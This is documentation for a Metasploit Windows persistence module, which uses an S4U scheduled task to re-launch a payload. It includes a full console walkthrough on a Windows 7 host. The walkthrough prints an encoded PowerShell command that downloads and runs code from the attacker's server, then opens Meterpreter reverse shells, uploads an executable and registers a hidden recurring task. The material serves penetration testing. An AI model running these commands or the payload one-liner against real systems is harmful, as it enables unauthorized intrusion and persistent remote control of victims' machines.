## Vulnerable Application

Creates a scheduled task that will run using service-for-user (S4U).
This allows the scheduled task to run even as an unprivileged user
that is not logged into the device. This will result in lower security
context, allowing access to local resources only. The module
requires 'Logon as a batch job' permissions (SeBatchLogonRight).

Creates a scheduled task to run the payload ever FREQUENCY minutes for
the duration of EXPIRE_TIME.

## Verification Steps

1. Start msfconsole
2. Get a user level shell
3. Do: `use exploit/windows/persistence/service_for_user/schedule`
4. Do: `set session #`
5. Do: `run`
6. You should eventually get a shell.

## Options

### FREQUENCY

Frequency in minutes to execute. Defaults to `60`

### EXPIRE_TIME

Number of minutes until trigger expires. Defaults to `0`

### PAYLOAD_NAME

Name of payload file to write. Random string as default.

### TASK_NAME

The name of task. Random string as default.

## Scenarios

### Windows 7 (6.1 Build 7601, Service Pack 1)

Initial shell

```
resource (/root/.msf4/msfconsole.rc)> setg verbose true
verbose => true
resource (/root/.msf4/msfconsole.rc)> setg lhost 1.1.1.18
lhost => 1.1.1.18
resource (/root/.msf4/msfconsole.rc)> use exploit/multi/script/web_delivery
[*] Using configured payload cmd/linux/http/x64/meterpreter/reverse_tcp
resource (/root/.msf4/msfconsole.rc)> set target 2
target => 2
resource (/root/.msf4/msfconsole.rc)> set srvport 8085
srvport => 8085
resource (/root/.msf4/msfconsole.rc)> set uripath w2
uripath => w2
resource (/root/.msf4/msfconsole.rc)> set payload payload/windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
resource (/root/.msf4/msfconsole.rc)> set lport 4449
lport => 4449
resource (/root/.msf4/msfconsole.rc)> run
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.
[*] Starting persistent handler(s)...
[*] Started reverse TCP handler on 1.1.1.18:4449 
[*] Using URL: http://1.1.1.18:8085/w2
[*] Server started.
[*] Run the following command on the target machine:
powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAA9AFsATgBlAHQALgBTAGUAYwB1AHIAaQB0AHkAUAByAG8AdABvAGMAbwBsAFQAeQBwAGUAXQA6ADoAVABsAHMAMQAyADsAJABtADMAQQA9AG4AZQB3AC0AbwBiAGoAZQBjAHQAIABuAGUAdAAuAHcAZQBiAGMAbABpAGUAbgB0ADsAaQBmACgAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AVwBlAGIAUAByAG8AeAB5AF0AOgA6AEcAZQB0AEQAZQBmAGEAdQBsAHQAUAByAG8AeAB5ACgAKQAuAGEAZABkAHIAZQBzAHMAIAAtAG4AZQAgACQAbgB1AGwAbAApAHsAJABtADMAQQAuAHAAcgBvAHgAeQA9AFsATgBlAHQALgBXAGUAYgBSAGUAcQB1AGUAcwB0AF0AOgA6AEcAZQB0AFMAeQBzAHQAZQBtAFcAZQBiAFAAcgBvAHgAeQAoACkAOwAkAG0AMwBBAC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsAfQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADIALgAyADIAOAA6ADgAMAA4ADUALwB3ADIALwBlAFAAVQBlAFUATQBBAHMANAB4AGEAbgByAHkAMQAnACkAKQA7AEkARQBYACAAKAAoAG4AZQB3AC0AbwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADIALgAyADIAOAA6ADgAMAA4ADUALwB3ADIAJwApACkAOwA=
msf exploit(multi/script/web_delivery) > 
[*] 2.2.2.2    web_delivery - Powershell command length: 3726
[*] 2.2.2.2    web_delivery - Delivering Payload (3726 bytes)
[*] Sending stage (230982 bytes) to 2.2.2.2
[*] Meterpreter session 1 opened (1.1.1.18:4449 -> 2.2.2.2:49760) at 2025-12-26 15:35:16 -0500

msf exploit(multi/script/web_delivery) > sessions -i 1
[*] Starting interaction with 1...

meterpreter > sysinfo
Computer        : WINDOWS7
OS              : Windows 7 (6.1 Build 7601, Service Pack 1).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
meterpreter > getuid
Server username: windows7\windows
meterpreter > background
[*] Backgrounding session 1...
```

Install persistence

```
msf exploit(multi/script/web_delivery) > use exploit/windows/persistence/service_for_user/schedule 
[*] Using configured payload cmd/linux/http/x64/meterpreter/reverse_tcp
msf exploit(windows/persistence/service_for_user/schedule) > set frequency 5
frequency => 5
msf exploit(windows/persistence/service_for_user/schedule) > set expire_time 7
expire_time => 7
msf exploit(windows/persistence/service_for_user/schedule) > set session 1
session => 1
msf exploit(windows/persistence/service_for_user/schedule) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf exploit(windows/persistence/service_for_user/schedule) > rexploit
[*] Reloading module...
[*] Exploit running as background job 1.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 1.1.1.18:4444 
msf exploit(windows/persistence/service_for_user/schedule) > [*] Running automatic check ("set AutoCheck false" to disable)
[+] The target appears to be vulnerable. Target is likely exploitable
[*] Uploading C:\Users\windows\AppData\Local\Temp\BruDqCGH.exe
[+] Successfully Uploaded remote executable to C:\Users\windows\AppData\Local\Temp\BruDqCGH.exe
[+] Successfully wrote XML file to C:\Users\windows\AppData\Local\Temp\KSPbcFQO.xml
[+] Persistence task LVNzSUTTA created successfully
[*] Meterpreter-compatible Cleanup RC file: /root/.msf4/logs/persistence/WINDOWS7_20251226.3810/WINDOWS7_20251226.3810.rc

msf exploit(windows/persistence/service_for_user/schedule) > date
[*] exec: date

Fri Dec 26 03:38:13 PM EST 2025
```

Wait

```
msf exploit(windows/persistence/service_for_user/schedule) > 
[*] Sending stage (188998 bytes) to 2.2.2.2
[*] Meterpreter session 2 opened (1.1.1.18:4444 -> 2.2.2.2:49768) at 2025-12-26 15:43:03 -0500

msf exploit(windows/persistence/service_for_user/schedule) > sessions -i 2
[*] Starting interaction with 2...

meterpreter > getuid
Server username: windows7\windows
```
